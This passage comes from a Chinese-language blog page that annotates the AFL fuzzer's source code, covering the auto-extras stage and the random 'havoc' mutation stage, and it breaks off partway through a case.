class="hljs-keyword">goto</span> skip_extras;<br><br>  stage_name  = <span class="hljs-string">&quot;auto extras (over)&quot;</span>;   <span class="hljs-comment">// auto extras (over)， 与 user extras (over)类似，这里替换的是a_extras</span><br>  stage_short = <span class="hljs-string">&quot;ext_AO&quot;</span>;<br>  stage_cur   = <span class="hljs-number">0</span>;<br>  stage_max   = MIN(a_extras_cnt, USE_AUTO_EXTRAS) * len;<br><br>  stage_val_type = STAGE_VAL_NONE;<br><br>  orig_hit_cnt = new_hit_cnt;<br><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br><br>    u32 last_len = <span class="hljs-number">0</span>;<br><br>    stage_cur_byte = i;<br><br>    <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; MIN(a_extras_cnt, USE_AUTO_EXTRAS); j++) &#123;<br><br>      <span class="hljs-comment">/* See the comment in the earlier code; extras are sorted by size. */</span><br><br>      <span class="hljs-keyword">if</span> (a_extras[j].len &gt; len - i ||<br>          !<span class="hljs-built_in">memcmp</span>(a_extras[j].data, out_buf + i, a_extras[j].len) ||<br>          !<span class="hljs-built_in">memchr</span>(eff_map + EFF_APOS(i), <span class="hljs-number">1</span>, EFF_SPAN_ALEN(i, a_extras[j].len))) &#123;<br><br>        stage_max--;<br>        <span class="hljs-keyword">continue</span>;<br><br>      &#125;<br><br>      last_len = a_extras[j].len;<br>      <span class="hljs-built_in">memcpy</span>(out_buf + i, a_extras[j].data, last_len);  <span class="hljs-comment">// 替换out_buf + i的数据为a_extras[j].data</span><br><br>      <span class="hljs-keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="hljs-keyword">goto</span> abandon_entry;<br><br>      stage_cur++;<br><br>    &#125;<br><br>    <span class="hljs-comment">/* Restore all the clobbered memory. */</span><br>    <span class="hljs-built_in">memcpy</span>(out_buf + i, in_buf + i, last_len);  <span class="hljs-comment">// 恢复原始数据</span><br><br>  &#125;<br><br>  new_hit_cnt = queued_paths + unique_crashes;<br><br>  stage_finds[STAGE_EXTRAS_AO]  += new_hit_cnt - orig_hit_cnt;<br>  stage_cycles[STAGE_EXTRAS_AO] += stage_max;<br><br>skip_extras:<br><br>  <span class="hljs-comment">/* If we made this to here without jumping to havoc_stage or abandon_entry,</span><br><span class="hljs-comment">     we&#x27;re properly done with deterministic steps and can mark it as such</span><br><span class="hljs-comment">     in the .state/ directory. */</span><br><br>  <span class="hljs-keyword">if</span> (!queue_cur-&gt;passed_det) mark_as_det_done(queue_cur);      <span class="hljs-comment">// 若queue_cur-&gt;passed_det为空，调用mark_as_det_done对cur进行标记</span><br><br></code></pre></td></tr></table></figure><h4 id="RANDOM-HAVOC"><a href="#RANDOM-HAVOC" class="headerlink" title="RANDOM HAVOC"></a>RANDOM HAVOC</h4><p>随机变异阶段，有很大的随机性。</p><p>主要有以下变异方式：</p><ol start="0"><li><p>随机翻转out_buf字节</p></li><li><p>随机选中interesting_8的值替换out_buf中的随机byte</p></li><li><p>随机选中interesting_16的值替换out_buf中的随机2bytes</p></li><li><p>随机选中interesting_32的值替换out_buf中的随机4bytes</p></li><li><p>随机选择out_buf中的1byte并随机减去一个值</p></li><li><p>随机选择out_buf中的1byte并随机加上一个值</p></li><li><p>随机选择out_buf中的2bytes并随机减去一个值</p></li><li><p>随机选择out_buf中的2bytes并随机加去一个值</p></li><li><p>随机选择out_buf中的4bytes并随机减去一个值</p></li><li><p>随机选择out_buf中的4bytes并随机加上一个值</p></li><li><p>随机选择out_buf中1byte与1~255中某个值进行异或</p></li><li><p>随机删除随机长度随机位置的值</p></li><li><p>随机删除随机长度随机位置的值</p></li><li><p>随机插入随机长度值</p></li><li><p>随机替换随机长度值</p></li><li><p>指定dict时，随机替换token</p></li><li><p>随机插入token</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-comment">/****************</span><br><span class="hljs-comment">   * RANDOM HAVOC *     // 随机变异阶段</span><br><span class="hljs-comment">   ****************/</span><br><br>havoc_stage:<br><br>  stage_cur_byte = <span class="hljs-number">-1</span>;<br><br>  <span class="hljs-comment">/* The havoc stage mutation code is also invoked when splicing files; if the</span><br><span class="hljs-comment">     splice_cycle variable is set, generate different descriptions and such. */</span><br><br>  <span class="hljs-keyword">if</span> (!splice_cycle) &#123;  <span class="hljs-comment">// 若splice_cycle为空，标记为havoc阶段</span><br><br>    stage_name  = <span class="hljs-string">&quot;havoc&quot;</span>;<br>    stage_short = <span class="hljs-string">&quot;havoc&quot;</span>;<br>    stage_max   = (doing_det ? HAVOC_CYCLES_INIT : HAVOC_CYCLES) *<br>                  perf_score / havoc_div / <span class="hljs-number">100</span>;<br><br>  &#125; <span class="hljs-keyword">else</span> &#123;      <span class="hljs-comment">// 否则，标记为splice阶段</span><br><br>    <span class="hljs-type">static</span> u8 tmp[<span class="hljs-number">32</span>];<br><br>    perf_score = orig_perf;<br><br>    <span class="hljs-built_in">sprintf</span>(tmp, <span class="hljs-string">&quot;splice %u&quot;</span>, splice_cycle);<br>    stage_name  = tmp;<br>    stage_short = <span class="hljs-string">&quot;splice&quot;</span>;<br>    stage_max   = SPLICE_HAVOC * perf_score / havoc_div / <span class="hljs-number">100</span>;<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (stage_max &lt; HAVOC_MIN) stage_max = HAVOC_MIN;<br><br>  temp_len = len;<br><br>  orig_hit_cnt = queued_paths + unique_crashes;<br><br>  havoc_queued = queued_paths;<br><br>  <span class="hljs-comment">/* We essentially just do several thousand runs (depending on perf_score)</span><br><span class="hljs-comment">     where we take the input file and make random stacked tweaks. */</span><br><br>  <span class="hljs-keyword">for</span> (stage_cur = <span class="hljs-number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;<br><br>    u32 use_stacking = <span class="hljs-number">1</span> &lt;&lt; (<span class="hljs-number">1</span> + UR(HAVOC_STACK_POW2)); <span class="hljs-comment">// 随机设置switch轮数</span><br><br>    stage_cur_val = use_stacking;<br> <br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; use_stacking; i++) &#123;<br><br>      <span class="hljs-keyword">switch</span> (UR(<span class="hljs-number">15</span> + ((extras_cnt + a_extras_cnt) ? <span class="hljs-number">2</span> : <span class="hljs-number">0</span>))) &#123; <span class="hljs-comment">// 随机产生值作为case</span><br><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>: <span class="hljs-comment">// 随机翻转out_buf字节</span><br><br>          <span class="hljs-comment">/* Flip a single bit somewhere. Spooky! */</span><br><br>          FLIP_BIT(out_buf, UR(temp_len &lt;&lt; <span class="hljs-number">3</span>));<br>          <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: <span class="hljs-comment">// 随机选中interesting_8的值替换out_buf中的随机byte</span><br><br>          <span class="hljs-comment">/* Set byte to interesting value. */</span><br><br>          out_buf[UR(temp_len)] = interesting_8[UR(<span class="hljs-keyword">sizeof</span>(interesting_8))];<br>          <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: <span class="hljs-comment">// 随机选中interesting_16的值替换out_buf中的随机2bytes</span><br><br>          <span class="hljs-comment">/* Set word to interesting value, randomly choosing endian. */</span><br><br>          <span class="hljs-keyword">if</span> (temp_len &lt; <span class="hljs-number">2</span>) <span class="hljs-keyword">break</span>;<br><br>          <span class="hljs-keyword">if</span> (UR(<span class="hljs-number">2</span>)) &#123;<br><br>            *(u16*)(out_buf + UR(temp_len - <span class="hljs-number">1</span>)) =<br>              interesting_16[UR(<span class="hljs-keyword">sizeof</span>(interesting_16) &gt;&gt; <span class="hljs-number">1</span>)];<br><br>          &#125; <span class="hljs-keyword">else</span> &#123;<br><br>            *(u16*)(out_buf + UR(temp_len - <span class="hljs-number">1</span>)) = SWAP16(<br>              interesting_16[UR(<span class="hljs-keyword">sizeof</span>(interesting_16) &gt;&gt; <span class="hljs-number">1</span>)]);<br><br>          &#125;<br><br>          <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>: <span class="hljs-comment">// 随机选中interesting_32的值替换out_buf中的随机4bytes</span><br><br>          <span class="hljs-comment">/* Set dword to interesting value, randomly choosing endian. */</span><br><br>          <span class="hljs-keyword">if</span> (temp_len &lt; <span class="hljs-number">4</span>) <span class="hljs-keyword">break</span>;<br><br>          <span class="hljs-keyword">if</span> (UR(<span class="hljs-number">2</span>)) &#123;<br>  <br>            *(u32*)(out_buf + UR(temp_len - <span class="hljs-number">3</span>)) =<br>              interesting_32[UR(<span class="hljs-keyword">sizeof</span>(interesting_32) &gt;&gt; <span class="hljs-number">2</span>)];<br><br>          &#125; <span class="hljs-keyword">else</span> &#123;<br><br>            *(u32*)(out_buf + UR(temp_len - <span class="hljs-number">3</span>)) = SWAP32(<br>              interesting_32[UR(<span class="hljs-keyword">sizeof</span>(interesting_32) &gt;&gt; <span class="hljs-number">2</span>)]);<br><br>          &#125;<br><br>          <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>: <span class="hljs-comment">// 随机选择out_buf中的1byte并随机减去一个值</span><br><br>          <span class="hljs-comment">/* Randomly subtract from byte. */</span><br><br>          out_buf[UR(temp_len)] -= <span class="hljs-number">1</span> + UR(ARITH_MAX);<br>          <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>: <span class="hljs-comment">// 随机选择out_buf中的1byte并随机加上一个值</span><br><br>          <span class="hljs-comment">/* Randomly add to byte. */</span><br><br>          out_buf[UR(temp_len)] += <span class="hljs-number">1</span> + UR(ARITH_MAX);<br>          <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>: <span class="hljs-comment">// 随机选择out_buf中的2bytes并随机减去一个值</span><br><br>          <span class="hljs-comment">/* Randomly subtract from word, random endian. */</span><br><br>          <span class="hljs-keyword">if</span> (temp_len &lt; <span class="hljs-number">2</span>) <span class="hljs-keyword">break</span>;<br><br>          <span class="hljs-keyword">if</span> (UR(<span class="hljs-number">2</span>)) &#123;<br><br>            u32 pos = UR(temp_len - <span class="hljs-number">1</span>);<br><br>            *(u16*)(out_buf + pos) -= <span class="hljs-number">1</span> + UR(ARITH_MAX);<br><br>          &#125; <span class="hljs-keyword">else</span> &#123;<br><br>            u32 pos = UR(temp_len - <span class="hljs-number">1</span>);<br>            u16 num = <span class="hljs-number">1</span> + UR(ARITH_MAX);<br><br>            *(u16*)(out_buf + pos) =<br>              SWAP16(SWAP16(*(u16*)(out_buf + pos)) - num);<br><br>          &#125;<br><br>          <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>: <span class="hljs-comment">// 随机选择out_buf中的2bytes并随机加去一个值</span><br><br>          <span class="hljs-comment">/* Randomly add to word, random endian. */</span><br><br>          <span class="hljs-keyword">if</span> (temp_len &lt; <span class="hljs-number">2</span>) <span class="hljs-keyword">break</span>;<br><br>          <span class="hljs-keyword">if</span> (UR(<span class="hljs-number">2</span>)) &#123;<br><br>            u32 pos = UR(temp_len - <span class="hljs-number">1</span>);<br><br>            *(u16*)(out_buf + pos) += <span class="hljs-number">1</span> + UR(ARITH_MAX);<br><br>          &#125; <span class="hljs-keyword">else</span> &#123;<br><br>            u32 pos = UR(temp_len - <span class="hljs-number">1</span>);<br>            u16 num = <span class="hljs-number">1</span> + UR(ARITH_MAX);<br><br>            *(u16*)(out_buf + pos) =<br>              SWAP16(SWAP16(*(u16*)(out_buf + pos)) + num);<br><br>          &#125;<br><br>          <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>: <span class="hljs-comment">// 随机选择out_buf中的4bytes并随机减去一个值</span><br><br>          <span class="hljs-comment">/* Randomly subtract from dword, random endian. */</span><br><br>          <span class="hljs-keyword">if</span> (temp_len &lt; <span class="hljs-number">4</span>) <span class="hljs-keyword">break</span>;<br><br>          <span class="hljs-keyword">if</span> (UR(<span class="hljs-number">2</span>)) &#123;<br><br>            u32 pos = UR(temp_len - <span class="hljs-number">3</span>);<br><br>            *(u32*)(out_buf + pos) -= <span class="hljs-number">1</span> + UR(ARITH_MAX);<br><br>          &#125; <span class="hljs-keyword">else</span> &#123;<br><br>            u32 pos = UR(temp_len - <span class="hljs-number">3</span>);<br>            u32 num = <span class="hljs-number">1</span> + UR(ARITH_MAX);<br><br>            *(u32*)(out_buf + pos) =<br>              SWAP32(SWAP32(*(u32*)(out_buf + pos)) - num);<br><br>          &#125;<br><br>          <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">9</span>: <span class="hljs-comment">// 随机选择out_buf中的4bytes并随机加上一个值</span><br><br>          <span class="hljs-comment">/* Randomly add to dword, random endian. */</span><br><br>          <span class="hljs-keyword">if</span> (temp_len &lt; <span class="hljs-number">4</span>) <span class="hljs-keyword">break</span>;<br><br>          <span class="hljs-keyword">if</span> (UR(<span class="hljs-number">2</span>)) &#123;<br><br>            u32 pos = UR(temp_len - <span class="hljs-number">3</span>);<br><br>            *(u32*)(out_buf + pos) += <span class="hljs-number">1</span> + UR(ARITH_MAX);<br><br>          &#125; <span class="hljs-keyword">else</span> &#123;<br><br>            u32 pos = UR(temp_len - <span class="hljs-number">3</span>);<br>            u32 num = <span class="hljs-number">1</span> + UR(ARITH_MAX);<br><br>            *(u32*)(out_buf + pos) =<br>              SWAP32(SWAP32(*(u32*)(out_buf + pos)) + num);<br><br>          &#125;<br><br>          <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">10</span>:        <span class="hljs-comment">// 随机选择out_buf中1byte与1~255中某个值进行异或</span><br><br>          <span class="hljs-comment">/* Just set a random byte to a random value. Because,</span><br><span class="hljs-comment">             why not. We use XOR with 1-255 to eliminate the</span><br><span class="hljs-comment">             possibility of a no-op. */</span><br><br>          out_buf[UR(temp_len)] ^= <span class="hljs-number">1</span> + UR(<span class="hljs-number">255</span>);<br>          <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">11</span> ... <span class="hljs-number">12</span>: &#123;       <span class="hljs-comment">// 随机删除随机长度随机位置的值</span><br><br>            <span class="hljs-comment">/* Delete bytes. We&#x27;re making this a bit more likely</span><br><span class="hljs-comment">               than insertion (the next option) in hopes of keeping</span><br><span class="hljs-comment">               files reasonably small. */</span><br><br>            u32 del_from, del_len;<br><br>            <span class="hljs-keyword">if</span> (temp_len &lt; <span class="hljs-number">2</span>) <span class="hljs-keyword">break</span>;<br><br>            <span class="hljs-comment">/* Don&#x27;t delete too much. */</span><br><br>            del_len = choose_block_len(temp_len - <span class="hljs-number">1</span>);   <span class="hljs-comment">// 随机选取长度</span><br><br>            del_from = UR(temp_len - del_len + <span class="hljs-number">1</span>);      <span class="hljs-comment">// 随机选取删除位置</span><br><br>            memmove(out_buf + del_from, out_buf + del_from + del_len,<br>                    temp_len - del_from - del_len);<br><br>            temp_len -= del_len;<br><br>            <span class="hljs-keyword">break</span>;<br><br>          &#125;<br><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">13</span>:        <span class="hljs-comment">// 随机插入</span><br><br>          <span class="hljs-keyword">if</span> (temp_len + HAVOC_BLK_XL &lt; MAX_FILE) &#123;     <span class="hljs-comment">// temp_len + 32768 &lt; 1024 * 1024</span><br><br>            <span class="hljs-comment">/* Clone bytes (75%) or insert a block of constant bytes (25%). */</span><br><br>            u8  actually_clone = UR(<span class="hljs-number">4</span>);<br>            u32 clone_from, clone_to, clone_len;<br>            u8* new_buf;<br><br>            <span class="hljs-keyword">if</span> (actually_clone) &#123;       <span class="hljs-comment">// 75%</span><br><br>              clone_len  = choose_block_len(temp_len);<br>              clone_from = UR(temp_len - clone_len + <span class="hljs-number">1</span>);<br><br>            &#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-comment">// 25%</span><br><br>              clone_len = choose_block_len(HAVOC_BLK_XL);<br>              clone_from = <span class="hljs-number">0</span>;<br><br>            &#125;<br><br>            clone_to   = UR(temp_len);<br><br>            new_buf = ck_alloc_nozero(temp_len + clone_len);<br><br>            <span class="hljs-comment">/* Head */</span><br><br>            <span class="hljs-built_in">memcpy</span>(new_buf, out_buf, clone_to);<br><br>            <span class="hljs-comment">/* Inserted part */</span><br><br>            <span class="hljs-keyword">if</span> (actually_clone)<br>              <span class="hljs-built_in">memcpy</span>(new_buf + clone_to, out_buf + clone_from, clone_len);<br>            <span class="hljs-keyword">else</span><br>              <span class="hljs-built_in">memset</span>(new_buf + clone_to,<br>                     UR(<span class="hljs-number">2</span>) ? UR(<span class="hljs-number">256</span>) : out_buf[UR(temp_len)], clone_len);<br><br>            <span class="hljs-comment">/* Tail */</span><br>            <span class="hljs-built_in">memcpy</span>(new_buf + clone_to + clone_len, out_buf + clone_to,<br>                   temp_len - clone_to);<br><br>            ck_free(out_buf);<br>            out_buf = new_buf;<br>            temp_len += clone_len;<br><br>          &#125;<br><br>          <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">14</span>: &#123;      <span class="hljs-comment">// 随机替换</span><br><br>            <span class="hljs-comment">/* Overwrite bytes with a randomly selected chunk (75%) or fixed</span><br><span class="hljs-comment">               bytes (25%). */</span><br><br>            u32 copy_from, copy_to, copy_len;<br><br>            <span class="hljs-keyword">if</span> (temp_len &lt; <span class="hljs-number">2</span>) <span class="hljs-keyword">break</span>;<br><br>            copy_len  = choose_block_len(temp_len - <span class="hljs-number">1</span>);<br><br>            copy_from = UR(temp_len - copy_len + <span class="hljs-number">1</span>);<br>            copy_to   = UR(temp_len - copy_len + <span class="hljs-number">1</span>);<br><br>            <span class="hljs-keyword">if</span> (UR(<span class="hljs-number">4</span>)) &#123;        <span class="hljs-comment">// 75%</span><br><br>              <span class="hljs-keyword">if</span> (copy_from != copy_to)<br>                memmove(out_buf + copy_to, out_buf + copy_from, copy_len);<br><br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-built_in">memset</span>(out_buf + copy_to,<br>                          UR(<span class="hljs-number">2</span>) ? UR(<span class="hljs-number">256</span>) : out_buf[UR(temp_len)], copy_len);<br><br>            <span class="hljs-keyword">break</span>;<br><br>          &#125;<br><br>        <span class="hljs-comment">/* Values 15 and 16 can be selected only if there are any extras</span><br><span class="hljs-comment">           present in the dictionaries. */</span><br><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">15</span>: &#123;      <span class="hljs-comment">// 指定dict时，随机替换token</span><br><br>            <span class="hljs-comment">/* Overwrite bytes with an extra. */</span><br><br>            <span class="hljs-keyword">if</span> (!extras_cnt || (a_extras_cnt &amp;&amp; UR(<span class="hljs-number">2</span>))) &#123;<br><br>              <span class="hljs-comment">/* No user-specified extras or odds in our favor. Let&#x27;s use an</span><br><span class="hljs-comment">                 auto-detected one. */</span><br><br>              u32 use_extra = UR(a_extras_cnt);<br>              u32 extra_len = a_extras[use_extra].len;<br>              u32 insert_at;<br><br>              <span class="hljs-keyword">if</span> (extra_len &gt; temp_len) <span class="hljs-keyword">break</span>;<br><br>              insert_at = UR(temp_len - extra_len + <span class="hljs-number">1</span>);<br>              <span class="hljs-built_in">memcpy</span>(out_buf + insert_at, a_extras[use_extra].data, extra_len);<br><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br><br>              <span class="hljs-comment">/* No auto extras or odds in our favor. Use the dictionary. */</span><br><br>              u32 use_extra = UR(extras_cnt);<br>              u32 extra_len = 